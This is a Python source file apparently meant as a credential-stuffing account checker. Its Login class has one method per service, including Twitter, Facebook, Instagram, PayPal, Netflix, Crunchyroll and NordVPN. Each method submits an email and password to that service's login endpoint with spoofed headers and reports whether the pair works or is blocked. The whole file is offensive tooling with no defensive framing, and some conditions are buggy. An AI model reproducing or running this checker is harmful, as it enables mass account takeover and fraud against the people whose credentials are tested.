import requests
from uuid import uuid4
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Login:
	def Tiwtter(Email,Pass):
		headers={
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
		'Content-Length': '901',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
		'Host': 'twitter.com',
		'Origin': 'https://twitter.com',
		'Referer': 'https://twitter.com/login?lang=ar',
		'TE': 'Trailers',
		'Upgrade-Insecure-Requests': '1',
		'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2708.48 Safari/537.36'
	        }
		data={
		'redirect_after_login': '/',
		'remember_me': '1',
		'authenticity_token': '10908ac0975311eb868c135992f7d397',
		'wfa': '1',
		'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		'session[username_or_email]': Email,
		'session[password]': Pass
	        }
		url = 'https://twitter.com/sessions'

		req=requests.post(url,headers=headers,data=data)
		if ("ct0") in req.cookies:
			true="True"
			return true
			pass
		else:
			fall='False'
			return fall
			pass
	
	
	def Facebook(Email,Pass):
		url = 'https://mobile.facebook.com/login.php'
		headers = {
'User-Agent' : 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2687.84 Safari/537.36',
'Accept-Language' : 'en-US,en;q=0.5'
}
		data = {
    'email': Email,
    'pass': Pass
    }
		
		Face = requests.post(url, headers=headers, data=data).text
		if "xc_message" in Face:
			true='True'
			return true
			pass
		elif "checkpointSubmitButton-actual-button" in Face:
			ch='Checkpoint'
			return ch
			pass
			
		else:
			fall='False'
			return fall
			pass
			
			
	def Instagram(Email,Pass):
		r = requests.Session()
		url = 'https://i.instagram.com/api/v1/accounts/login/'
		headers = {
		'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
		'Accept': "*/*",
		'Cookie': 'missing',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'en-US',
		'X-IG-Capabilities': '3brTvw==',
		'X-IG-Connection-Type': 'WIFI',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'Host': 'i.instagram.com'}
		uid = str(uuid4())
		data = {        
		'uuid': uid,
		'password': Pass,
		'username': Email,
		'device_id': uid,
		'from_reg': 'false',
		'_csrftoken': 'missing',
		'login_attempt_countn': '0'}
		req_login = r.post(url,headers=headers,data=data,allow_redirects=True)

		#My Channel
        
		if ("logged_in_user") in req_login.text:
				true='True'
				return true
				pass
		elif 'message' and "challenge_required" and "challenge" in req_login.text:
				sec='Security'
				return sec
				pass
		else:
				fall='False'
				return fall
				pass
		      	
		      	
		      	
		      	
	def Paypal(Email,Pass):
		url = 'https://www.paypal.com/signin'
		headers = {
'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0',
'Accept': 'application/json',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.5',
'Connection': 'keep-alive',
'Content-type': 'application/x-www-form-urlencoded',
'Content-Length': '1089',
'Host': 'www.paypal.com',
'X-Requested-With': 'XMLHttpRequest'
}

		data = {
'login_email': Email,
'login_password': Pass
	}
		r = requests.Session()

		req = r.post(url,headers=headers,data=data)
		res = req
		
		if 'myaccount' in req.text:
			true='True'
			return true
			pass
		elif 'Too many requests' in req.text:
			band='Banned In Requests'
			return band
			pass
		else:
			fall='False'
			return fall
			pass
			
			
	def Noon(Email,Pass):
		head = {
			'Host': 'api-app.noon.com',
			'Cookie': 'missing',
			'Content-Type': 'application/json',
			'X-Experience': 'ecom',
			'X-Locale': 'ar-sa',
			'Accept': 'application/json, text/plain, */*',
			'X-Mp': 'noon',
			'Accept-Language': 'en-us',
			'Cache-Control': 'no-cache',
			'X-Content': 'mobile',
			'Content-Length': '52',
			'User-Agent': 'noon/1000 CFNetwork/1237 Darwin/20.4.0',
			'X-Device-Id': '9149EBD3-33DE-4568-918B-0469ECAA6453',
			'X-Platform': 'ios',
			'X-Build': '1000',
			'Connection': 'close'}
		data = {"email": Email, "password": Pass}
		try:
			req1 = requests.post("https://api-app.noon.com/_svc/customer-v1/auth/signin", headers=head, json=data, timeout=4)
			if req1.status_code == 200:
				hit = 'True'
				return hit
			else:
				f = 'False'
				return f
		except:
			r = 'Error'
			return r
			
			
	def CrunchyRoll(Email,Pass):
		try:
			head = {
				'Host': 'beta-api.crunchyroll.com',
				'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
				'Content-Length': '72',
				'Accept': '*/*',
				'Cookie': '__cf_bm=e5139fd59755316a1d33207946e491eedca399d4-1622012072-1800-AXtJ1LgqzVNJZK3q5xqlwl/WszKCJLs42G5q/2Eol1mjpzqNk1vMvaNLTGLhSdox4RZOxCMM3j6m+7AgqcL21rJzugUjmo3ZHo+xht26QxhF',
				'Connection': 'keep-alive',
				'ETP-Anonymous-ID': '4CDCA8EE-660B-4820-86AC-65CC26A2834B',
				'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2735.10 Safari/537.36',
				'Accept-Language': 'ar-SA;q=1.0',
				'Authorization': 'Basic M2V2eDJudnF1ZTB1eG5wemJ2aG86NGZMUWRmQmVJdk1yNlVPei1Fb1N3aXZ0cmZ6Ym9HOFU=',
				'Accept-Encoding': 'gzip;q=1.0, compress;q=0.5'}
			data = {
				'grant_type': 'password',
				'password': Pass,
				'scope': 'offline_access',
				'username': Email}
			req = requests.post('https://beta-api.crunchyroll.com/auth/v1/token', headers=head, data=data)
			if 'refresh_token' in req.text:
				t = 'True'
				return t
			elif 'force_password_reset' in req.text:
				q = 'False'
				return q
			elif 'invalid_credentials' in req.text:
				qqq = 'False'
				return qqq
			elif 'too_many_requests' in req.text:
				ww = 'Blocked In Requests'
				return ww
			elif '406 Not Acceptable' in req.text:
				w = 'Blocked In Requests'
				return w
			elif 'Attention Required!' in req.text:
				e = 'Security'
				return e
			else:
				qq = 'False'
				return qq
		except:
			s = 'Error'
			return s


	def Namshi(Email,Pass):
		try:
			url = 'https://login.namshi.com/_svc/jerry/v2/login'
			data = {"email": Email, "password": Pass}
			headers = {
				'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2735.10 Safari/537.36'}
			net = requests.post(url, headers=headers, data=data)
			if "كلمة السر / البريد الالكتروني الذي تم إدخاله غير صحيح" in net:
				i = 'False'
				return i
			elif "email" in net:
				r = 'True'
				return r
			else:
				q = False
				return q
		except:
			q = 'Error'
			return q


	def EpicGames(Email,Pass):
		try:
			url = 'https://aj-https.my.com/cgi-bin/auth?Lang=en_US&mp=android&mmp=mail&DeviceID=&client=mobile&udid=&instanceid=cEHwYCtZfcM&playservices=212116037&connectid=&os=Android&os_version=10&ver=com.my.mail13.13.1.33372&appbuild=33372&vendor=Xiaomi&model=Redmi%20Note%209S&device_type=tablet&country=US&language=en_US&timezone=GMT%2B02%3A00&device_name=Xiaomi%20Redmi%20Note%209S&DeviceInfo=%7B%22OS%22%3A%22Android%22%2C%22AppVersion%22%3A%22com.my.mail13.13.1.33372%22%2C%22AppBuild%22%3A%2233372%22%2C%22Device%22%3A%22Redmi%20Note%209S%22%2C%22Timezone%22%3A%22GMT%2B02%3A00%22%2C%22DeviceName%22%3A%22Xiaomi%20Redmi%20Note%209S%22%2C%22Useragent%22%3A%22Mozilla%5C%2F5.0%20(Linux%3B%20Android%2010%3B%20Redmi%20Note%209S%20Build%5C%2FQKQ1.191215.002%3B%20wv)%20AppleWebKit%5C%2F537.36%20(KHTML%2C%20like%20Gecko)%20Version%5C%2F4.0%20Chrome%5C%2F91.0.4472.120%20Mobile%20Safari%5C%2F537.36%22%2C%22playservices%22%3A%22212116037%22%2C%22connectid%22%3A%224a93e679058284a39a7d6da21038cf5b%22%7D&idfa=<idfa>&appsflyerid=&current=google&first=google&md5_signature=<ms>'
			data = {'Password': Pass, 'oauth2': '0', 'Login': Email, 'mobile': '1', 'mob_json': '1', 'simple': '1',
					'useragent': 'android', 'md5_post_signature': 'defbd7686b82ef1f17d3a1145aac0263'}
			headers = {
				'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2735.10 Safari/537.36'}
			net = requests.post(url, headers=headers, data=data, verify=False)
			if '"Ok=1"' in net.text:
				q = 'True'
				return q
			elif '"Ok=0"' in net.text:
				w = 'False'
				return w
		except:
			d = 'Error'
			return d


	def Netflix(Email,Pass):
		try:
			url = 'https://api-global.netflix.com/account/auth'
			data = {'email': Email, 'password': Pass, 'setCookies': 'true'}
			headers = {
				'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2735.10 Safari/537.36'}
			net = requests.post(url, headers=headers, data=data, verify=False)
			if '"NetflixId":null,"user":{"' in net.text or 'Incorrect email address or password' in net.text or 'Missing password' in net.text or 'NEVER_MEMBER' in net.text:
				q = 'False'
				return q
			elif 'Invalid Request' in net.text:
				r = 'Banned In Requests'
				return r
			elif 'CURRENT_MEMBER' in net.text:
				d = 'True'
				return d
			elif 'FORMER_MEMBER' in net.text:
				s = 'Security'
				return s
		except:
			d = 'Error'
			return d
			

	def NordVpn(User, Pass):
		try:
			url = 'https://zwyr157wwiu6eior.com/v1/users/tokens'
			data = {'username': User, 'password': Pass}
			headers = {
				'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2735.10 Safari/537.36'}
			net = requests.post(url, headers=headers, data=data)
			if '"Invalid username"' or '"invalid password"' or 'Unauthorized' in net.text or net.status_code == 401:
				f = 'False'
				return f
			elif 'user_id' in net.text or net.status_code == 201:
				y = 'True'
				return y
		except:
			b = 'Error'
			return b